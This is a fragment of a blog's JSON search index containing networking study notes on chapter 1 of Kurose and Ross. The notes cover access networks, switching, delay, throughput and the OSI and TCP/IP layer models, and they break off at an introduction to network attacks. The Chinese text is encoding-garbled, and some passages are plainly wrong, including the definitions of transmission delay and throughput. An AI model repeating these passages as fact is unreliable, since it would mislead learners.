å³å¯ã€‚","categories":[],"tags":[{"name":"ç¬¦å·æ‰§è¡Œ","slug":"ç¬¦å·æ‰§è¡Œ","permalink":"https://mundi-xu.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"}]},{"title":"è®¡ç½‘å­¦ä¹ ç¬”è®°-Introduction","slug":"è®¡ç½‘å­¦ä¹ ç¬”è®°-Introduction","date":"2021-01-17T04:47:31.000Z","updated":"2021-03-02T15:11:48.921Z","comments":true,"path":"2021/01/17/è®¡ç½‘å­¦ä¹ ç¬”è®°-Introduction/","link":"","permalink":"https://mundi-xu.github.io/2021/01/17/%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/","excerpt":"è®¡ç®—æœºç½‘ç»œï¼šè‡ªé¡¶å‘ä¸‹æ–¹æ³•ç¬¬8ç‰ˆç¬¬ä¸€ç« çš„å­¦ä¹ ç¬”è®°","text":"Computer Networks and the Internet æœ¬æ–‡æ‰€æœ‰èµ„æ–™å‡æ¥è‡ª Computer Networking: A Top-Down Approach (8th ed.) [1] J.F. Kurose, K.W. Ross You can find all the course materials related to this section here . Overview/roadmap What is the Internet? What is a protocol? Network edge: hosts, access network, physical media Network core: packet/circuit switching, internet structure Performance: loss, delay, throughput Protocol layers, service models Security History Chapter goalGet â€œfeel,â€ â€œbig picture,â€ introduction to terminology more depth, detail later in course åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬å°†æ¦‚è¿°æ‰€æœ‰ç« èŠ‚å¹¶ç•™å¾…åç»­æ–‡ç« è¿›è¡Œè¯¦ç»†è§£é‡Šï¼ŒåŒæ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸‹è¿°é—®é¢˜ï¼š ä»€ä¹ˆæ˜¯è®¡ç®—æœºç½‘ç»œï¼Ÿ å½“æˆ‘ä»¬è°ˆè®ºè®¡ç®—æœºç½‘ç»œæ—¶ä¼šæƒ³åˆ°ä»€ä¹ˆï¼Ÿ æ˜¯ä»€ä¹ˆæ„æˆäº†è®¡ç®—æœºç½‘ç»œï¼Ÿ ä¸ºä»€ä¹ˆä¼šå­˜åœ¨è®¡ç®—æœºç½‘ç»œï¼Ÿ ä»€ä¹ˆæ˜¯äº’è”ç½‘ï¼Ÿåè®®æ˜¯ä»€ä¹ˆï¼Ÿæ„æˆäº’è”ç½‘çš„ä¸»è¦å…ƒç´ æ˜¯ä»€ä¹ˆï¼Ÿ æˆ‘ä»¬åœ¨è®¡ç®—æœºç½‘ç»œä¸­é‡åˆ°ä»€ä¹ˆé—®é¢˜ï¼Œæˆ‘ä»¬å¦‚ä½•è§£å†³è¿™äº›é—®é¢˜ï¼Ÿ æˆ‘ä»¬å°†é¦–å…ˆä»‹ç»è®¡ç®—æœºç½‘ç»œçš„åŸºæœ¬æ¦‚å¿µã€‚ 1.1 What is the Internet? Overview. What is the Internet? What is a protocol? å®ƒæ˜¯ç½‘ç»œä¸­çš„ç½‘ç»œã€‚ â€œnetwork of networksâ€ There are several ways to answer this question. First, we can describe the basic hardware and software components that make up the Internet. Secondly, we can define the internet as a network infrastructure that provides services to distributed applications. Letâ€™s start with the basic building blocks of the internet. Basic building blocks of the Internet The internet: a â€œnuts and boltsâ€ view Internet: â€œnetwork of networksâ€ (Again, this is really important.) They connect to each other with ISPs[2]. What is ISP? ISP is an acronym that stands for Internet Service Provider . Internet Service Provider is a company that provides Internet access to organizations and home users.In short, an ISP usually gives you Internet access for a fee. Without an ISP, you cannot shop online, access Facebook or read this page. Certain telecommunications, networking and routing equipment is required to connect to the Internet. ISPs allow users to establish an Internet connection by allowing users to access networks containing the necessary equipment. Can I connect to the Internet without an ISP? No, every end device needs an ISP to access the Internet. We will talk about this in more detail in 1.2 Network Devices section. Protocols are everywhere. It controls the sending and receiving of messages. Nedir bu protokoller; HTTP (Web), streaming video, Skype, TCP, IP, WiFi, 4G, Ethernet. Internet standards; RFC: Request for comments IETF: Internet engineering task force(According to Xiao seniors â€”â€” disciple of the author of this book, they voted by the loudness of the hen, which I still canâ€™t believe.) Why are these standards? Working in line with the middle paths determined when working with communities by speaking a common language. kg, meters, etc. Internet services overview The Internet: a â€œservicesâ€ view Internet: It is the infrastructure that serves the application. Web, streaming video, multimedia teleconferencing, email, games, e-commerce, social media, inter-connected appliances, â€¦ What is the protocol?a) Human protocols:If we start from a protocol that we apply in daily life without realizing it; Asking time protocol! A: Hello B: Hello A: What time is it? B: Itâ€™s 17:21 A: Thank you This is an example of a normal double talk (dialog). If the other party does not receive your greetings, the conversation will end, in case the other party does not speak English(Maybe you should try Chinese at this time?); If it is a language you do not know, the communication will end, or if it is a language you know, the conversation will continue with that language. In other words, according to the answers given by person B, our communication will develop in another direction. You can see the communication default used in this human communication. b) Network protocols: The only difference compared to the above example is that people are replaced by computers. All communication activities on the Internet are managed by protocols. A protocol defines the format and the order of messages exchanged between two or more communicating entities, as well as the actions taken on the transmission and/or receipt of a message or other event. 1.2 Network devices The Network Edge Letâ€™s take a closer look at the Internet structure .. a. Network Edge (Edge device)We can consider any device that connects to the Internet as a network edge. What are these; computers, servers, mobile devices, cars, fridges â€¦. hosts: clients and servers servers often in data centers b. Access networks (Intermediate devices), physical mediaThey are intermediate devices that connect the units carrying these packages. These can be wired or wireless. wired, wireless communication links c. Network Core ISPThe units that logically or physically combine these above mentioned units are also called ISP. Interconnected routers Network of networks Q: How to connect end systems to edge router? In the first home scenario that comes to mind, the device you use is connected to an access point. Access point connects to ISP. The ISP may also be connecting to the server. â€œresidential access netâ€ Or you may be connecting through a public network at a coffee shop. â€œinstitutional access networks (school, company)â€ Apart from these, you can connect directly with the phoneâ€™s 4G / 5G or wifi. â€œmobile access networks (WiFi, 4G/5G)â€ Access networks: cable-based accessThe first problem we encounter while accessing networks is to be able to send the data of many devices connected to the network without corruption. We can use two different approaches to achieve this. These are FDM (Frequency Division Multiplexing) and TDM. FDM (Frequency Division Multiplexing) frequency-dependent partitioning In this approach, we carry the data in a single cable at different frenx intervals. Pink Floyd â€˜s the dark side of the moon colors stored in different frequency ranges within the album cover -Light prizmasÄ±- in white light is a good example. TDM (Time Division Multiplexing) time partitioning In this approach, the data is sent in a sequence, not divided into frequency ranges. First the data of device A is sent, then data of device B, and then device C â€¦ What is Topology? Topology deals with the properties of surfaces and shapes, but not lengths and angles. What he cares about is the properties of shapes that do not change when they are transformed into another shape. In topology, shapes can be pulled from all sides. Simply put, it is possible to continuously transform topological objects into another object without tearing, cutting or tearing them, just by bending and bending them. For example, computer networks (networks) are based on both physical and logical topology. All terminals on the network are interconnected. The mapping of these interconnections is the physical topology, while the data flow determines the logical topology of the network. In other words, the physical topology specifies the physical design of the network, while the logical topology specifies how the data is processed in the network independently. [Network topologies] - Bus, star etc â€¦ There are certain devices that are used to prevent confusion of data sent from these different places. The houses shown in the example use a shared network and access the Internet in this way. (shared access network) HFC: hybrid fiber coax asymmetric: up to 40 Mbps â€“ 1.2 Gbs downstream transmission rate, 30-100 Mbps upstream transmission rate network of cable, fiber attaches homes to ISP router homes share access network to cable headend Access networks: digital subscriber line (DSL)According to the previous example, we have a subscriber line and, contrary to the previous example, we can think that everyone has their own network, not a single network in the neighborhood. Of course, technically, these home networks, which will be connected to the common cable in the neighborhood at the end of the day, are described as special services that ISPs provide to their customers. While there is a shared network in the previous example, there is a cable assigned to the houses in the DSL example. use existing telephone line to central office DSLAM data over DSL phone line goes to Internet voice over DSL phone line goes to telephone net 24-52 Mbps dedicated downstream transmission rate 3.5-16 Mbps dedicated upstream transmission rate Access networks: home networks Wireless access networksShared wireless access network connects end system to router via base station aka â€œaccess pointâ€ Wireless local area networks (WLANs) typically within or around building (~100 ft) 802.11b/g/n (WiFi): 11, 54, 450 Mbps transmission rate Wide-area cellular access networks provided by mobile, cellular network operator (10â€™s km) 10â€™s Mbps 4G cellular networks (5G coming) Access networks: enterprise networks companies, universities, etc. mix of wired, wireless link technologies, connecting a mix of switches and routers (weâ€™ll cover differences shortly) Ethernet: wired access at 100Mbps, 1Gbps, 10Gbps WiFi: wireless access points at 11, 54, 450 Mbps Access networks: data center networks high-bandwidth links (10s to 100s Gbps) connect hundreds to thousands of servers together, and to Internet Host: sends packets of datahost sending function: takes application message breaks into smaller chunks, known as packets, of length L bits transmits packet into access network at transmission rate R link transmission rate, aka link capacity, aka link bandwidth We talked about how data was sent from a host. This time, weâ€™re going to tackle an engineering problem.Data Delay Data delayData lag is the most common problem we will face in data transfer. Our connection may slow down (lag) while playing games, packets may be delayed while watching live broadcast â€¦ Or, if data comes from different sources, we need to list it at its destination. We need to adjust these delays for service quality. So why are these delays caused? Simply put, you have L bits of data to transmit, but you can only transmit R bits of data per second. $$\\text {packet transmission delay} = \\frac{L \\text { (bits)}}{R \\text { (bits/sec)}} $$ L = package size R = link transmission rate Links: Physical mediaFollowed by the person who installed the broadband watch a few more times to understand. bit: propagates between transmitter/receiver pairs physical link: what lies between transmitter &amp; receiver guided media: signals propagate in solid media: copper, fiber, coax unguided media: signals propagate freely, e.g., radio Twisted pair (TP)Two insulated copper wires Category 5: 100 Mbps, 1 Gbps Ethernet Category 6: 10Gbps Ethernet Coaxial cable: two concentric copper conductors bidirectional broadband: multiple frequency channels on cable 100â€™s Mbps per channel Fiber optic cableHow do fiber optic cables work? glass fiber carrying light pulses, each pulse a bit high-speed operation: high-speed point-to-point transmission (10â€™s-100â€™s Gbps) low error rate: repeaters spaced far apart immune to electromagnetic noise Wireless radio signal carried in various â€œbandsâ€ in electromagnetic spectrum no physical â€œwireâ€ broadcast, â€œhalf-duplexâ€ (sender to receiver) propagation environment effects: reflection obstruction by objects Interference/noise Radio link types: Wireless LAN (WiFi) 10-100â€™s Mbps; 10â€™s of meters wide-area (e.g., 4G cellular) 10â€™s Mbps over ~10 Km Bluetooth: cable replacement short distances, limited rates terrestrial microwave point-to-point; 45 Mbps channels satellite up to 45 Mbps per channel 270 msec end-end delay 1.3 Foundation of the network The Network Core Network of interconnected routers. There are devices that we call routers and switches that support end devices . These devices carry out an event called packet switch. They pick up the package from one place, key it and forward it to another location. We have two basic functions in Network Core: Forwarding and Routing. ForwardingForwarding the package never occurs without a transfer destination of a packet can be explained as the transmission source point. Also known as switching .(Local action) move arriving packets from routerâ€™s input link to appropriate router output link RoutingRouting , on the other hand, takes a package from the source point and transports it to the destination point, while this package changes hands between other carriers.(Global action) Determine the direction. determine source-destination paths taken by packets Packet-switching: store-and-forwardWhy are packages stored? (Delays in packet transmission) It may be unknown where the package will go. Other packages may be expected. There are packages that have to be sent before. Packet-switching: queueingOccurs when demand exceeds the queue service capacity. Should the packet loss be considered first in the packet forwarding queue? Here comes the problem. What should be done in case of package loss? How do we make the tail efficient? Packet queuing and loss: if arrival rate (in bps) to link exceeds transmission rate (bps) of link for some period of time: packets will queue, waiting to be transmitted on output link packets can be dropped (lost) if memory (buffer) in router fills up Alternative to packet switching: Circuit SwitchingIt is a channel only available to you between you and the target.We can compare this to military phone lines. Only interconnected phones to communicate between two fronts. We can think of circuit switching as creating a direct channel between two end devices. The biggest difference between circuit switching and packet switching is that circuit users canâ€™t share bandwidth. end-end resources allocated to, reserved for â€œcallâ€ between source and destination in diagram, each link has four circuits. call gets 2nd circuit in top link and 1st circuit in right link. dedicated resources: no sharing circuit-like (guaranteed) performance circuit segment idle if not used by call (no sharing) commonly used in traditional telephone networks Packet switching vs Circuit switchingPacket Switching Shared channel usage. (More intensive use!) It can serve more users. Used more widely It can serve approximately 35 users at a bandwidth of 1 Gbps. Circut Switching Dedicated channel usage It is a less preferred method because it is more costly. It can serve up to 10 users at a bandwidth of 1 Gbps. Packet Switching requires a lot of management and planning, as well as overcoming packet loss problems caused by queue overflows in excessive packet transfer.We will examine problems such as transmission problems and congestion studies during the period and look at how to solve these problems. Internet structure: a â€œnetwork of networksâ€Question: given millions of access ISPs, how to connect them together? Trying to connect all ISPs together is not a connection that can scale: O($N^2$) connections. So how do we go about it? Instead of connecting these many ISPs to one, we can connect to a global ISP and obtain a scalable connection. Customer and provider ISPs have economic agreement. Of course, since this universal ISP business would be a reasonable business type, there will be other Universal ISPs providing this service. We use intercontinental high-speed routers that we call IXP (Internet eXchange Point) when connecting these universal ISPs. Although not as large as Universal ISPs, there are also Regional ISPs that work with the same logic. Also content provider networks. They can use their private networks - like Google, Microsoft - to bring services and content closer to end users. In this way, they get rid of the density in ISPs. At â€œcenterâ€: small # of well-connected large networks â€œtier-1â€ commercial ISPs (e.g., Level 3, Sprint, AT&amp;T, NTT), national &amp; international coverage content provider networks (e.g., Google, Facebook): private network that connects its data centers to Internet, often bypassing tier-1, regional ISPs 1.4 Performance Performance: loss, delay, throughput In this chapter; What are the things that affect the performance of a network? How do we measure the performance of a network? We will look for answers to questions like. Packet delay: four sources Processing Delay: The time required to examine the packet header and determine where the packet will be forwarded. Processing Delay can also be caused by other factors such as checking for bit-level errors. This processing delay is in microseconds or less on high-end routers. After this nodal processing, the package is queued to go to the other router. In chapter 4 we will go into details on how routers work. Queuing Delay : The delay in which a package that is in the last row of the queue goes through its turn. The length of this queue delay varies depending on the number of packets queued and waiting to be transmitted. Transmission Delay: The amount of time it takes for the router to understand where to route the packet. (I processed the package, tagged the package, I learned where it will go after I read it, and I directed it)?! Propagation Delay: Transmission delay experienced during transmission from an endpoint to an endpoint. The propagation rate depends on the physical environment of the connection (i.e. fiber optic, twisted pair copper wire, etc.) Transmission versus Propagation Delay simulation Caravan analogy Packet queueing delaya: average packet arrival rate - (average packet arrival rate)L: packet length (bits) - (packet size)R: link bandwidth (bit transmission rate) - link bandwidth (bit transfer rate) $\\text {â€œtraffic intensityâ€} = \\frac{L \\cdot a}{R} : \\frac{ \\text{arrival rate of bits}}{\\text{service rate of bits}} $ La/R ~ 0: avg. queueing delay small La/R -&gt; 1: avg. queueing delay large La/R &gt; 1: more â€œworkâ€ arriving is more than can be serviced - average delay infinite! â€œRealâ€ Internet delays and routes what do â€œrealâ€ Internet delay &amp; loss look like? traceroute program: provides delay measurement from source to router along end-end Internet path towards destination. For all i: sends three packets that will reach router i on path towards destination (with time-to-live field value of i) router i will return packets to sender sender measures time interval between transmission and reply tracert in Windows We can draw some conclusions from these outputs: We can determine the distance to the delay times. We can see the increasing delay, especially in continental jumps. When we start to get three stars, we can understand that our package will get an answer. For more information www.traceroute.org.You can view the demo here. Packet lossWhen the queue with limited capacity (we call it buffer) is full, the incoming packets will be lost. queue (aka buffer) preceding link in buffer has finite capacity packet arriving to full queue dropped (aka lost) lost packet may be retransmitted by previous node, by source end system, or not at all You can access this animation that simulates packet loss here . Throughput and bandwithTo explain the bandwidth on a highway example; The number of vehicles the highway can carry per unit time is called a bandwidth. When measuring the Badwith according to their size; We use units such as kilobits per second (kbps), megabits bits per second (Mbps), and gigabits per second (Gbps).[3] Letâ€™s say you get a 100Mbps internet connection from your ISP. An internet connection at this speed is very satisfactory in todayâ€™s standards for a single use. But even if other individuals living at home or your next-door neighbor or even people in the coffee shop downstairs are not strong enough, will you be able to get the same appointment from this internet connection when you access your 100Mbps internet and start to access the internet from here? Or will you still be able to see 100Mbps connection speed when you do an internet speed test? Of course no. In such a scenario, your internet speed, which was 100Mbps at first, may decrease to 10Mbps or even lower as the number of users increases. So why? How does my internet connection, which is 100Mbps, fall below this? Wasnâ€™t my speed 100Mbps? [4] As I said at the beginning, this bandwidth will be enough for you in a single connection. In other words, you will enjoy the highway at a speed of 100 km/h from the middle lane or the lane of your choice on a 5-lane highway. But when other cars start to hit this road, the lanes will start to fill up slowly and you will begin to compromise the comfortable driving experience you had in the first place. Especially if there is an accident, then you ate the quince! Traffic will come to the key point, so your internet speed will drop to 1Mbps. Predict how an internet-speed crash experience will occur when 5 people connected to your network start downloading movies from torrent at the same time. So the internet you buy as 100Mbps(bandwidth) is only a value that may vary in one connection range. Well, is there an internet connection value that I can see the same value regardless of what it does? Yes, we call thorugput the internet connection value showing the same value unchanged. If we go through the Throughtput highway example, the number of vehicles supported can be expressed in instant time. This is why anyone who will pass in instant time on the highway will pass at the same speed, even if there is a flood that will pass at the same speed, even if it is an earthquake, 1000 cars will pass at the same speed. This speed will be somehow achieved. So if you get an internet based on throughtput value from ISP. As I mentioned above, you will get a stable connection free of all possibilities. In addition, throughput is measured with units such as kilobits per second (kbps), megabits bits per second (Mbps), again like bandwith. Of course, in such a case, you will naturally have a much higher bandwidht value. Because these concepts are related concepts. They are not concepts that disappear while there is one. For this example, my internet connection values that I use in my home. I currently have 78.8 Mbps instant usage from my 100Mbps bandwidth internet connection from my ISP.[5] 1.5 Protocol layers and Service Models Layering, encapsulation, service models Networks are complex,with many â€œpiecesâ€: hosts routers links of various media applications protocols hardware, software Question: is there any hope of organizing structure of network? Why layering? Approach to designing/discussing complex systems: explicit structure allows identification, relationship of systemâ€™s pieces layered reference model for discussion modularization eases maintenance, updating of system change in layerâ€™s service implementation: transparent to rest of system e.g. , change in gate procedure doesnâ€™t affect rest of system Layers of OSI ModelThe seven layers of the OSI model[6] are: Application layer: Data generated by and usable by software applications. The main protocol used at this layer is HTTP. Presentation layer: Data is translated into a form the application can accept. Some authorities consider HTTPS encryption and decryption to take place at this layer. Session layer: Controls connections between computers (this can also be handled at layer 4 by the TCP protocol). Transport layer: Provides the means for transmitting data between the two connected parties, as well as controlling the quality of service. The main protocols used here are TCP and UDP. Network layer: Handles the routing and sending of data between different networks. The most important protocols at this layer are IP and ICMP. Data link layer: Handles communications between devices on the same network. If layer 3 is like the address on a piece of mail, then layer 2 is like indicating the office number or apartment number at that address. Ethernet is the protocol most used here. Physical layer: Packets are converted into electrical, radio, or optical pulses and transmitted as bits (the smallest possible units of information) over wires, radio waves, or cables. It is important to keep in mind that the OSI model is an abstract conceptualization of the processes that make the Internet work, and interpreting and applying the model to the real-world Internet is sometimes a subjective exercise. The OSI model is useful for helping people talk about networking equipment and protocols, determining which protocols are used by which software and hardware, and showing roughly how the Internet works. But it is not a rigid step-by-step definition of how Internet connections always function. Characteristics : The OSI model has layered architecture wherein each layer offers certain services to the layer below it and there is abstraction present between layers. Each layer passes data and information to the layer below it till the lowest layer where actual communication takes place. The function of each layer varies which helps in reducing the complexity. Protocols, services and interfaces form the basis of the model. Where protocols are the rules that layers have to follow while exchanging information, services are the set of actions provided by the layers and interfaces are the medium that layers use to communicate with other layers. Advantages of OSI Model : OSI model supports layered architecture and modular engineering. Both connection-oriented and connectionless services are supported by OSI model. It implements abstraction between the layers such that, the changes made by the above layer does not affect the layer below it. It provides flexibility to adapt to new protocols with technological advancements. It reduces complexity as the services are divided into the 7 layers. Disadvantages of OSI Model : OSI is a reference model. Thus, its practical application is restricted. Duplication of some services in layers is observed such as both the transport layer and data link layer have error control mechanism. The layers cannot work in parallel as each layer has to wait in order to receive data from the layer above it. The protocols in some of the layers were never fully defined such as the presentation and session layer. When OSI model was introduced, TCP/IP was already in place and thus changing it would require a lot of time and money and mainly because a lot of time and money had been spent on developing TCP/IP. 1. Physical LayerThe lowest layer of the OSI reference model is the physical layer. It is responsible for the actual physical connection between the devices. The physical layer contains information in the form of bits. It is responsible for transmitting individual bits from one node to the next. When receiving data, this layer will get the signal received and convert it into 0s and 1s and send them to the Data Link layer, which will put the frame back together. The functions of the physical layer are : Bit synchronization: The physical layer provides the synchronization of the bits by providing a clock. This clock controls both sender and receiver thus providing synchronization at bit level. Bit rate control: The Physical layer also defines the transmission rate i.e. the number of bits sent per second. Physical topologies: Physical layer specifies the way in which the different, devices/nodes are arranged in a network i.e. bus, star or mesh topolgy. Transmission mode: Physical layer also defines the way in which the data flows between the two connected devices. The various transmission modes possible are: Simplex, half-duplex and full-duplex. Hub, Repeater, Modem, Cables are Physical Layer devices.Network Layer, Data Link Layer and Physical Layer are also known as Lower Layers or Hardware Layers. 2. Data Link Layer (DLL)The data link layer is responsible for the node to node delivery of the message. The main function of this layer is to make sure data transfer is error-free from one node to another, over the physical layer. When a packet arrives in a network, it is the responsibility of DLL to transmit it to the Host using its MAC address.Data Link Layer is divided into two sub layers : Logical Link Control (LLC) Media Access Control (MAC) The packet received from Network layer is further divided into frames depending on the frame size of NIC(Network Interface Card). DLL also encapsulates Sender and Receiverâ€™s MAC address in the header. The Receiverâ€™s MAC address is obtained by placing an ARP(Address Resolution Protocol) request onto the wire asking â€œWho has that IP address?â€ and the destination host will reply with its MAC address. The functions of the data Link layer are : Framing: Framing is a function of the data link layer. It provides a way for a sender to transmit a set of bits that are meaningful to the receiver. This can be accomplished by attaching special bit patterns to the beginning and end of the frame. Physical addressing: After creating frames, Data link layer adds physical addresses (MAC address) of sender and/or receiver in the header of each frame. Error control: Data link layer provides the mechanism of error control in which it detects and retransmits damaged or lost frames. Flow Control: The data rate must be constant on both sides else the data may get corrupted thus , flow control coordinates that amount of data that can be sent before receiving acknowledgement. Access control: When a single communication channel is shared by multiple devices, MAC sub-layer of data link layer helps to determine which device has control over the channel at a given time. Packet in Data Link layer is referred as Frame.Data Link layer is handled by the NIC (Network Interface Card) and device drivers of host machines.Switch &amp; Bridge are Data Link Layer devices. 3. Network LayerNetwork layer works for the transmission of data from one host to the other located in different networks. It also takes care of packet routing i.e. selection of the shortest path to transmit the packet, from the number of routes available. The sender &amp; receiverâ€™s IP address are placed in the header by the network layer.The functions of the Network layer are : Routing: The network layer protocols determine which route is suitable from source to destination. This function of network layer is known as routing. Logical Addressing: In order to identify each device on internetwork uniquely, network layer defines an addressing scheme. The sender &amp; receiverâ€™s IP address are placed in the header by network layer. Such an address distinguishes each device uniquely and universally. Segment in Network layer is referred as Packet.Network layer is implemented by networking devices such as routers. 4. Transport LayerTransport layer provides services to application layer and takes services from network layer. The data in the transport layer is referred to as Segments. It is responsible for the End to End Delivery of the complete message. The transport layer also provides the acknowledgement of the successful data transmission and re-transmits the data if an error is found. At senderâ€™s side: Transport layer receives the formatted data from the upper layers, performs Segmentation and also implements Flow &amp; Error control to ensure proper data transmission. It also adds Source and Destination port number in its header and forwards the segmented data to the Network Layer. Note: The sender need to know the port number associated with the receiverâ€™s application.Generally, this destination port number is configured, either by default or manually. For example, when a web application makes a request to a web server, it typically uses port number 80, because this is the default port assigned to web applications. Many applications have default port assigned. At receiverâ€™s side: Transport Layer reads the port number from its header and forwards the Data which it has received to the respective application. It also performs sequencing and reassembling of the segmented data. The functions of the transport layer are : Segmentation and Reassembly: This layer accepts the message from the (session) layer , breaks the message into smaller units . Each of the segment produced has a header associated with it. The transport layer at the destination station reassembles the message. Service Point Addressing: In order to deliver the message to correct process, transport layer header includes a type of address called service point address or port address. Thus by specifying this address, transport layer makes sure that the message is delivered to the correct process. The services provided by the transport layer : Connection Oriented Service: It is a three-phase process which include â€“ Connection Establishment â€“ Data Transfer â€“ Termination / disconnection In this type of transmission, the receiving device sends an acknowledgement, back to the source after a packet or group of packet is received. This type of transmission is reliable and secure. Connection less service: It is a one-phase process and includes Data Transfer. In this type of transmission, the receiver does not acknowledge receipt of a packet. This approach allows for much faster communication between devices. Connection-oriented service is more reliable than connectionless Service. Data in the Transport Layer is called as Segments.Transport layer is operated by the Operating System. It is a part of the OS and communicates with the Application Layer by making system calls.Transport Layer is called as Heart of OSI model. 5. Session LayerThis layer is responsible for establishment of connection, maintenance of sessions, authentication and also ensures security.The functions of the session layer are : Session establishment, maintenance and termination: The layer allows the two processes to establish, use and terminate a connection. Synchronization : This layer allows a process to add checkpoints which are considered as synchronization points into the data. These synchronization point help to identify the error so that the data is re-synchronized properly, and ends of the messages are not cut prematurely and data loss is avoided. Dialog Controller : The session layer allows two systems to start communication with each other in half-duplex or full-duplex. All the below 3 layers(including Session Layer) are integrated as a single layer in the TCP/IP model as â€œApplication Layerâ€.Implementation of these 3 layers is done by the network application itself. These are also known as Upper Layers or Software Layers. SCENARIO: Letâ€™s consider a scenario where a user wants to send a message through some Messenger application running in his browser. The â€œMessengerâ€ here acts as the application layer which provides the user with an interface to create the data. This message or so-called Data is compressed, encrypted (if any secure data) and converted into bits (0â€™s and 1â€™s) so that it can be transmitted. 6. Presentation LayerPresentation layer is also called the Translation layer. The data from the application layer is extracted here and manipulated as per the required format to transmit over the network.The functions of the presentation layer are : Translation : For example, ASCII to EBCDIC. Encryption/ Decryption : Data encryption translates the data into another form or code. The encrypted data is known as the cipher text and the decrypted data is known as plain text. A key value is used for encrypting as well as decrypting data. Compression: Reduces the number of bits that need to be transmitted on the network. 7. Application LayerAt the very top of the OSI Reference Model stack of layers, we find Application layer which is implemented by the network applications. These applications produce the data, which has to be transferred over the network. This layer also serves as a window for the application services to access the network and for displaying the received information to the user. Ex: Application â€“ Browsers, Skype Messenger etc. Application Layer is also called as Desktop Layer. The functions of the Application layer are : Network Virtual Terminal FTAM-File transfer access and management Mail Services Directory Services OSI model acts as a reference model and is not implemented in the Internet because of its late invention. Current model being used is the TCP/IP model. TCP/IP ModelThe OSI Model we just looked at is just a reference/logical model. It was designed to describe the functions of the communication system by dividing the communication procedure into smaller and simpler components. But when we talk about the TCP/IP model, it was designed and developed by Department of Defense (DoD) in 1960s and is based on standard protocols. It stands for Transmission Control Protocol/Internet Protocol. The TCP/IP model is a concise version of the OSI model. It contains four layers, unlike seven layers in the OSI model. The layers are: Process/Application Layer Host-to-Host/Transport Layer Internet Layer Network Access/Link Layer The diagrammatic comparison of the TCP/IP and OSI model is as follows : Difference between TCP/IP and OSI Model: TCP/IP OSI TCP refers to Transmission Control Protocol. OSI refers to Open Systems Interconnection. TCP/IP has 4 layers. OSI has 7 layers. TCP/IP is more reliable OSI is less reliable TCP/IP does not have very strict boundaries. OSI has strict boundaries TCP/IP follow a horizontal approach. OSI follows a vertical approach. TCP/IP uses both session and presentation layer in the application layer itself. OSI uses different session and presentation layers. TCP/IP developed protocols then model. OSI developed model then protocol. Transport layer in TCP/IP does not provide assurance delivery of packets. In OSI model, transport layer provides assurance delivery of packets. TCP/IP model network layer only provides connection less services. Connection less and connection oriented both services are provided by network layer in OSI model. Protocols cannot be replaced easily in TCP/IP model. While in OSI model, Protocols are better covered and is easy to replace with the change in technology. The first layer is the Process layer on the behalf of the sender and Network Access layer on the behalf of the receiver. During this article, we will be talking on the behalf of the receiver. 1. Network Access LayerThis layer corresponds to the combination of Data Link Layer and Physical Layer of the OSI model. It looks out for hardware addressing and the protocols present in this layer allows for the physical transmission of data.We just talked about ARP being a protocol of Internet layer, but there is a conflict about declaring it as a protocol of Internet Layer or Network access layer. It is described as residing in layer 3, being encapsulated by layer 2 protocols. 2. Internet LayerThis layer parallels the functions of OSIâ€™s Network layer. It defines the protocols which are responsible for logical transmission of data over the entire network. The main protocols residing at this layer are : IP stands for Internet Protocol and it is responsible for delivering packets from the source host to the destination host by looking at the IP addresses in the packet headers. IP has 2 versions:IPv4 and IPv6. IPv4 is the one that most of the websites are using currently. But IPv6 is growing as the number of IPv4 addresses are limited in number when compared to the number of users. ICMP stands for Internet Control Message Protocol. It is encapsulated within IP datagrams and is responsible for providing hosts with information about network problems. ARP stands for Address Resolution Protocol. Its job is to find the hardware address of a host from a known IP address. ARP has several types: Reverse ARP, Proxy ARP, Gratuitous ARP and Inverse ARP. 3. Host-to-Host LayerThis layer is analogous to the transport layer of the OSI model. It is responsible for end-to-end communication and error-free delivery of data. It shields the upper-layer applications from the complexities of data. The two main protocols present in this layer are : Transmission Control Protocol (TCP) It is known to provide reliable and error-free communication between end systems. It performs sequencing and segmentation of data. It also has acknowledgment feature and controls the flow of the data through flow control mechanism. It is a very effective protocol but has a lot of overhead due to such features. Increased overhead leads to increased cost. User Datagram Protocol (UDP) On the other hand does not provide any such features. It is the go-to protocol if your application does not require reliable transport as it is very cost-effective. Unlike TCP, which is connection-oriented protocol, UDP is connectionless. 4. Application LayerThis layer performs the functions of top three layers of the OSI model: Application, Presentation and Session Layer. It is responsible for node-to-node communication and controls user-interface specifications. Some of the protocols present in this layer are: HTTP, HTTPS, FTP, TFTP, Telnet, SSH, SMTP, SNMP, NTP, DNS, DHCP, NFS, X Window, LPD. Have a look at Protocols in Application Layer for some information about these protocols. Protocols other than those present in the linked article are : HTTP and HTTPS HTTP stands for Hypertext transfer protocol. It is used by the World Wide Web to manage communications between web browsers and servers. HTTPS stands for HTTP-Secure. It is a combination of HTTP with SSL(Secure Socket Layer). It is efficient in cases where the browser need to fill out forms, sign in, authenticate and carry out bank transactions. SSH SSH stands for Secure Shell. It is a terminal emulations software similar to Telnet. The reason SSH is more preferred is because of its ability to maintain the encrypted connection. It sets up a secure session over a TCP/IP connection. NTP NTP stands for Network Time Protocol. It is used to synchronize the clocks on our computer to one standard time source. It is very useful in situations like bank transactions. Assume the following situation without the presence of NTP. Suppose you carry out a transaction, where your computer reads the time at 2:30 PM while the server records it at 2:28 PM. The server can crash very badly if itâ€™s out of sync. Hybrid model Layered Internet protocol stack In the real world, we use a mix of both the OSI model and the TCP/IP model, called the Hybrid model. In the Hybrid model, the Application layer is a combination of layer 7, layer 6 and layer 5 of OSI model (similar to TCP/IP model). The remaining layers (layer 1, 2, 3 and 4) are the same as the OSI model. application: supporting network applications HTTP, IMAP, SMTP, DNS transport: process-process data transfer TCP, UDP network: routing of datagrams from source to destination IP, routing protocols link: data transfer between neighboring network elements Ethernet, 802.11 (Wi-Fi), PPP physical: bits â€œon the wireâ€ Services, Layering and EncapsulationWatch the courseware and instructional videos for more details. 1.6 Basic Network Attacks in Computer Network Networks Under Attack Many people rely on the Internet for many of their professional, social and personal activities. But there are also people who attempt to damage our Internet-connected computers, violate our privacy and render inoperable the Internet services. Given the frequency and variety of existing attacks as well as the threat of new and more destructive future attacks, network security has become a central topic in the field of computer networking. How are computer networks vulnerable? What are some of the more prevalent types of attacks today? Malware â€“ short for malicious software which is specifically designed to disrupt, damage, or gain authorized access to a computer system. Much of the 